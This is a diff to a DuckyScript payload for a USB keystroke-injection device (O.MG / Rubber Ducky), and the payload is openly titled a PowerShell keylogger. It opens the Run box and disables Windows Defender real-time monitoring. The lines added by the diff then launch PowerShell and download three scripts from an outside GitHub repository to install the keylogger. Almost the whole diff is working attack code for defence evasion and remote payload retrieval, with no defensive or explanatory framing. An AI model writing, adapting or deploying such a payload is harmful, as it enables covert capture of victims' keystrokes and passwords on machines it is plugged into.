@@ -1,5 +1,5 @@
-REM Powershell Keylogger for the USB RubberDucky
-REM created by : C0SM0
+REM Powershell Keylogger for the O.MG
+REM created by : Marshmadnesss/C0SM0
 
 REM STAGE1
 REM open runbox
@@ -13,6 +13,23 @@ DELAY 300
 REM STAGE2
 REM attempts to disable defender
 STRING Set-MpPreference -DisableRealtimeMonitoring $true;
+ENTER
+
+REM STAGE3
+REM will download needed files (c.cmd, l.ps1, .p.ps1) to directory
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell
+ENTER
+DELAY 300
+STRING $Script = Invoke-WebRequest https://raw.githubusercontent.com/marshmadnesss/keyfinder/main/c.cmd -OutFile .\c.cmd
+ENTER
+STRING $Script = Invoke-WebRequest https://github.com/marshmadnesss/keyfinder/blob/main/l.ps1 -OutFile .\l.ps1
+ENTER
+STRING
+$Script = Invoke-WebRequest https://github.com/marshmadnesss/keyfinder/blob/main/p.ps1 -OutFile .\p.ps1
+
 
 REM STAGE 3
 REM move files to appropiate directories
